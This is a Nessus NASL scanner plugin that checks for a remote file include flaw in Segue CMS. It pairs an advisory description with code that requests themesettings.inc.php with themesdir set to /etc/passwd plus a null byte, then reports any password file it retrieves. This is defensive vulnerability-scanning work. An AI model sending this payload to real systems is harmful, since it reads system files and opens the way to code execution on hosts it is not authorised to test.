#	
#	This script was written by Justin Seitz	<jms@bughunter.ca>
#	
#


desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is affected by a
remote file include issue. 

Description:

The remote web server is running Segue CMS, an open source content
management system tailored for educational institutions. 

The version of Segue CMS installed on the remote host fails to
sanitize input to the 'themesdir' parameter before using it in the
'themes/program/themesettings.inc.php' script to include PHP code. 
Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker can exploit this issue to view arbitrary
files and execute arbitrary code, possibly taken from third-party
hosts, on the remote host. 

See also :

http://www.milw0rm.com/exploits/2600
http://www.nessus.org/u?5c00bd47

Solution :

Update to version 1.5.9 or later.

Risk factor :

Medium / CVSS Base Score : 6
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";

if(description)
{
 # set script identifiers

 script_id(22922);
 script_version("$Revision: 1.1 $");

 script_bugtraq_id(20640);
 script_xref(name:"OSVDB", value:"29904");

 name["english"] = "Segue CMS themesdir Parameter Remote File Include Vulnerability";
 summary["english"] = "Tries to read a local file with Segue CMS";
 family["english"] = "CGI abuses";

 script_name(english:name["english"]);
 script_description(english:desc["english"]);
 script_summary(english:summary["english"]);

 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2006 Justin Seitz");

 script_family(english:family["english"]);

 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

#
# verify we can talk to the web server, if not exit
#

if(!get_port_state(port)) exit(0);
if(!can_host_php(port:port)) exit(0);

#
# create list of directories to scan
#


# Loop through directories.
if (thorough_tests) dirs = make_list("/segue","/seguecms","/cms","/blog","/forum", cgi_dirs());
else dirs = make_list(cgi_dirs());

#
# Iterate through the list
#

file = "/etc/passwd";

foreach dir (dirs) {

#
#
#       Attack: Attempt a remote file include of /etc/passwd
#
#
  attackreq = http_get(item:string(dir, "/themes/program/themesettings.inc.php?themesdir=", file, "%00"),port:port);
  attackres = http_keepalive_send_recv(port:port, data:attackreq, bodyonly:TRUE);

  if (attackres == NULL) exit(0);

  if (dir == "") dir = "/";

  if (egrep(pattern:"root:.*:0:[01]:", string:attackres) ||
    string("main(", file, "\\0themes/program/themesettings.inc.php): failed to open stream") >< attackres ||
    string("main(", file, "): failed to open stream: No such file") >< attackres ||
    "open_basedir restriction in effect. File(" >< attackres)	{

    passwd = "";
    if (egrep(pattern:"root:.*:0:[01]:", string:attackres))	{
      passwd = attackres;
      if ("<br" >< passwd) passwd = passwd - strstr(passwd, "<br");
      if ("Choose the color scheme" >< passwd) 
        passwd = passwd - strstr(passwd, "Choose the color scheme");
    }

    if (passwd) {
      info = string("The version of Segue CMS installed in directory '", dir, "'\n",
        "is vulnerable to this issue. Here is the contents of /etc/passwd\n",
        "from the remote host :\n\n", passwd);
     report = string(desc["english"],"\n\nPlugin output\n\n",info);
    }
    else report = desc["english"];

    security_warning(data:report, port:port);
    exit(0);
  }
}
